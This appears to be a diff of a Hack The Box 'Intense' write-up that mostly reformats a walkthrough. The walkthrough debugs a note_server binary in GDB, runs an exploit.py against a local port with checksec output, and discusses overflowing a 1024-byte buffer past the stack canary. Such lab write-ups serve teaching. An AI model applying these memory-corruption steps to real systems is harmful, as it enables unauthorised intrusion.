@@ -588,6 +588,7 @@ ezi0x00@kali:~/HTB/Intense$ ldd note_server
         libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4dde41e000)
         /lib64/ld-linux-x86-64.so.2 (0x00007f4ddea12000)
 ```
+
 ```
 def write(data):
     p.send("\x01")
@@ -635,7 +636,11 @@ gef➤
 ```shell
 gef➤ set follow-fork-mode child
 ```
+
+
 >`follow-fork-mode` is set to child, which instructs `GDB` to attach to the child after `fork`.
+
+
 ```shell
 gef➤ b main
 Breakpoint 1 at 0x146c
@@ -707,15 +712,36 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤    
 ```
+
 breakpoint at `main` and `run`
 see `list` of code and know which line there are `write` case to breakpoint on it to send shell code cause this `case`  write the content of the note array. 
-then `continue` Parallel to running the script
+then `continue` Parallel to running the script.
 
 ```shell
 gef➤  b 82
 Breakpoint 2 at 0x55555555542c: file note_server.c, line 82.
 gef➤  c
-Continuing.
+Continuing
+```
+```shell
+ezi0x00@kali:~/HTB/Intense$ python3 exploit.py 
+[*] '/home/ezi0x00/HTB/Intense/note_local'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 127.0.0.1 on port 5001: Done
+```
+```shell.
+gef➤  c
+Continuing
 Continuing.
 [Attaching after process 15551 fork to child process 15562]
 [New inferior 2 (process 15562)]
@@ -785,22 +811,8 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  
 ```
-```shell
-ezi0x00@kali:~/HTB/Intense$ python3 exploit.py 
-[*] '/home/ezi0x00/HTB/Intense/note_local'
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-[*] '/lib/x86_64-linux-gnu/libc.so.6'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-[+] Opening connection to 127.0.0.1 on port 5001: Done
-```
+
+
 >If it works for you, you'll see a lot of A in the stack.
 
 We already know that the canary places 8 byts at the top of the stack and that we fill the buffer with 1024
